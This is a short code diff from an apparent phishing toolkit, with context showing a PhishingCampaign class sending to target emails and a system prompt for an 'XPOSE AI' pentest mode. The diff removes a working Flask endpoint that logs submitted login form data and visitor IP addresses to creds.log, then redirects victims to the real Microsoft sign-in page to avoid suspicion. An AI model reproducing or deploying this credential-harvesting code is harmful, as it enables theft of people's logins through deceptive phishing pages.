@@ -1409,16 +1409,6 @@ class PhishingCampaign:
             except Exception as e:
                 print(f"[-] Failed: {{target['email']}} - {{e}}")
 
-# Credential logging server
-from flask import Flask, request
-app = Flask(__name__)
-
-@app.route('/submit', methods=['POST'])
-def capture():
-    with open('creds.log', 'a') as f:
-        f.write(f"{{datetime.now()}}|{{request.remote_addr}}|{{request.form}}\\n")
-    # Redirect to real login to avoid suspicion
-    return redirect('https://login.microsoftonline.com')
 
 PENTEST_SYSTEM_PROMPT = '''# XPOSE AI - STRUCTURED PENTEST MODE
 ## Framework: {framework_name}
